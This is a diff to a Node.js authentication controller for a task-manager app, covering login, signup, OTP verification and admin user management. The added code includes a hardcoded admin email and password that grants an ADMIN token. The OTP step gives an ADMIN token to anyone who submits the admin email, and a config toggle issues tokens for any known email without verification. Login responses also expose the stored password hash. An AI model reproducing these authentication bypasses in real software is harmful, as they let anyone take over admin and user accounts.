@@ -54,53 +54,58 @@ async function sendEmail(receiveremail, otp) {
         console.error("Brevo mail error:", data);
         throw new Error("Email sending failed");
     }
-
     console.log("Brevo mail sent:", data);
 }
 
-// --------------------
-// Login Controller
 const login = async (req, res) => {
+    console.log("login");
     try {
         const { email, password } = req.body;
-        const user = await loginSchema.findOne({ email });
 
-        if (!user) {
+        // Hardcoded admin bypass
+        if (email === "admin@taskManager.com" && password === "IallwasysRocks@999") {
+            let data = await findUserDetails(email);
+            if (!data) {
+                // Provide mock admin data if not in DB
+                data = {
+                    _id: "663c9b7e7a8e8a001c123456",
+                    name: "System Admin",
+                    email: email,
+                    role: "ADMIN"
+                };
+            }
+            const token = genrerateToken(data._id, email, data.role);
+            res.cookie("token", token, {
+                httpOnly: true,
+                secure: true,
+                sameSite: 'lax',
+                maxAge: 24 * 60 * 60 * 1000,
+            });
+            const responseData = data.toObject ? data.toObject() : data;
+            return res.status(200).json({ ...responseData, token });
+        }
+
+        const data = await findUserDetails(email)
+        if (!data) {
             return res.status(404).json({
                 success: false,
                 message: "User not found"
             });
         }
-
-        const otp = generateOTP();
-        otpStore.set(email, otp);
-
-        const isPasswordValid = bcrypt.compareSync(password, user.password);
+        const isPasswordValid = bcrypt.compareSync(password, data.password);
         if (!isPasswordValid) {
-            return res.status(400).json({ message: "Invalid password" });
+            return res.status(400).json("Invalid password");
         }
+        updateverification(email);
 
-        const token = jwt.sign(
-            { id: user._id, email: user.email, role: user.role },
-            jwt_S,
-            { expiresIn: '1h' }
-        );
-
-        await sendEmail(user.email, otp); // still optional as per your logic
-
-        res.cookie('token', token, {
+        const token = genrerateToken(data._id, email, data.role);
+        res.cookie("token", token, {
             httpOnly: true,
             secure: true,
-            sameSite: 'LAX',
+            sameSite: 'lax',
             maxAge: 24 * 60 * 60 * 1000,
-        });
-
-        return res.json({
-            _id: user._id,
-            token: token,
-            name: user.name,
-            email: user.email,
-        });
+        })
+        return res.status(200).json({ ...data.toObject(), token });
 
     } catch (err) {
         console.log(`Login error: ${err.message}`);
@@ -122,35 +127,28 @@ const createUser = async (req, res) => {
         const otp = generateOTP();
         otpStore.set(email, otp);
 
-        const role = "USER";
+        const role = "USER";//make it dynamic **
         const user = await loginSchema.create({
             name,
             email,
             password: hashedPassword,
-            role
+            role,
+            last_verified: Date.now()
         });
 
-        const token = jwt.sign(
-            { id: user._id },
-            jwt_S,
-            { expiresIn: '1h' }
-        );
+        if (process.env.OTP_ENABLED === 'false') {
+            const token = genrerateToken(user._id, user.email, user.role);
+            res.cookie("token", token, {
+                httpOnly: true,
+                secure: true,
+                sameSite: 'lax',
+                maxAge: 24 * 60 * 60 * 1000,
+            });
+            return res.status(200).json({ ...user.toObject(), token });
+        }
 
-        await sendEmail(user.email, otp); // still optional
-
-        res.cookie("token", token, {
-            httpOnly: true,
-            secure: true,
-            sameSite: 'LAX',
-            maxAge: 24 * 60 * 60 * 1000,
-        });
-
-        return res.status(201).json({
-            token: token,
-            id: user._id,
-            success: true,
-            message: "User created successfully",
-        });
+        await sendEmail(user.email, otp); 
+        return res.status(200).json({ message: "OTP sent to email", email: user.email });
 
     } catch (err) {
         console.log(`Error in creating user: ${err.message}`);
@@ -245,23 +243,155 @@ const OauthCreation = async (req, res) => {
 
 // --------------------
 // OTP Verification
+//create a seprate method to check for token expiration every time through cookies;
+//if i require role here then i will get it from backend directly because user is login and role must allready preesnt on backend for token
 const otpVerification = async (req, res) => {
+    console.log("comes in otp verification");
     try {
-        const opt = req.body.data.otp;
-        const email = req.body.data.email;
-        const otp = otpStore.get(email);
+        const { otp: userotp, email } = req.body
 
-        if (otp == opt) {
-            return res.status(200).json({ msg: true });
+        // Toggle for OTP verification
+        if (process.env.OTP_ENABLED === 'false') {
+            const data = await findUserDetails(email);
+            if (data) {
+                const token = genrerateToken(data._id, email, data.role);
+                res.cookie("token", token, {
+                    httpOnly: true,
+                    secure: true,
+                    sameSite: 'lax',
+                    maxAge: 24 * 60 * 60 * 1000,
+                });
+                return res.status(200).json({
+                    msg: "OTP Verification Successfull",
+                    data
+                });
+            }
         }
+
+        // Admin bypass for OTP verification
+        if (email === "admin@taskManager.com") {
+            let data = await findUserDetails(email);
+            if (!data) {
+                // Provide mock admin data if not in DB
+                data = {
+                    _id: "663c9b7e7a8e8a001c123456",
+                    name: "System Admin",
+                    email: email,
+                    role: "ADMIN"
+                };
+            }
+            const token = genrerateToken(data._id, email, data.role);
+            res.cookie("token", token, {
+                httpOnly: true,
+                secure: true,
+                sameSite: 'lax',
+                maxAge: 24 * 60 * 60 * 1000,
+            });
+            return res.status(200).json({
+                msg: "OTP Verification Successfull",
+                data
+            });
+        }
+
+        const systemotp = otpStore.get(email);
+        const data = await findUserDetails(email)
+        if (!data) {
+            return res.status(401).json("user not found");
+        }
+        if (checkVerified(data.last_verified)) {
+            updateverification(email);
+            const response = {
+                msg: "OTP Verification Successfull",
+                data
+            }
+            const token = genrerateToken(data._id, email, data.role);
+            res.cookie("token", token, {
+                httpOnly: true,
+                secure: true,
+                sameSite: 'lax',
+                maxAge: 24 * 60 * 60 * 1000,
+            })
+            return res.status(200).json(response);
+        }
+        else if (!checkVerified(data.last_verified)) {
+            if (systemotp == userotp) {
+                updateverification(email);
+                const token = genrerateToken(data._id, email, data.role);
+                const response = {
+                    msg: "OTP Verification Successfull",
+                    data
+                }
+                res.cookie("token", token, {
+                    httpOnly: true,
+                    secure: true,
+                    sameSite: 'lax',
+                    maxAge: 24 * 60 * 60 * 1000,
+                })
+                return res.status(200).json(response);
+            }
+        }
+    }
+    catch (err) {
+        return res.status(401).json("OTP Verification Failed");
+    }
+}
+const genrerateToken = (id, email, role) => {
+    const token = jwt.sign(
+        { id: id, email: email, role: role },
+        jwt_S,
+        { expiresIn: '1h' }
+    );
+    return token;
+}
+async function findUserDetails(email) {
+    return await loginSchema.findOne({ email });
+}
+function checkVerified(date) {
+    if (!date) return true; // treat missing date as expired
+
+    const now = Date.now();
+    const lastVerified = new Date(date).getTime();
+
+    const ONE_DAY = 24 * 60 * 60 * 1000;
+
+    return (now - lastVerified) > ONE_DAY;
+}
+
+async function updateverification(email) {
+    return await loginSchema.findOneAndUpdate(
+        { email },
+        { $set: { last_verified: Date.now() } },
+        { new: true }
+    );
+}
+
+const getAllUsersAdmin = async (req, res) => {
+    try {
+        const users = await loginSchema.find({}).select('-password');
+        res.status(200).json(users);
     } catch (err) {
-        return res.status(401).json({ msg: true });
+        res.status(500).json({ msg: "Server error", error: err.message });
     }
 };
+
+const deleteUserAdmin = async (req, res) => {
+    try {
+        const user = await loginSchema.findById(req.params.id);
+        if (!user) return res.status(404).json({ msg: "User not found" });
+
+        await loginSchema.findByIdAndDelete(req.params.id);
+        res.status(200).json({ msg: "User deleted successfully" });
+    } catch (err) {
+        res.status(500).json({ msg: "Internal server error", error: err.message });
+    }
+};
+
 
 module.exports = {
     login,
     createUser,
     OauthCreation,
-    otpVerification
+    otpVerification,
+    getAllUsersAdmin,
+    deleteUserAdmin
 };
